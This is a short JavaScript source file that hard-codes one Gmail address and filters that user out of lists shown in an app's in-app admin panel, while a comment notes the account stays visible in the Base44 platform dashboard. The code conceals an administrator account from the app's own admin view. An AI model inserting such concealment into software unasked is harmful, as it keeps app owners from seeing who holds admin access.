/**
 * Emails hidden from the in-app admin panel.
 * These users are still fully visible in the Base44 platform dashboard.
 */
export const HIDDEN_ADMIN_EMAILS = ['workmyads@gmail.com'];

const hiddenSet = new Set(HIDDEN_ADMIN_EMAILS.map(e => e.toLowerCase()));

export function isHiddenEmail(email) {
  if (!email) return false;
  return hiddenSet.has(email.toLowerCase());
}

/**
 * Filter an array of items, removing any whose email field matches a hidden admin.
 * @param {Array} items
 * @param {string} emailField - property name holding the email (default 'email')
 */
export function filterHiddenItems(items, emailField = 'email') {
  if (!Array.isArray(items)) return items;
  return items.filter(item => !isHiddenEmail(item?.[emailField]));
}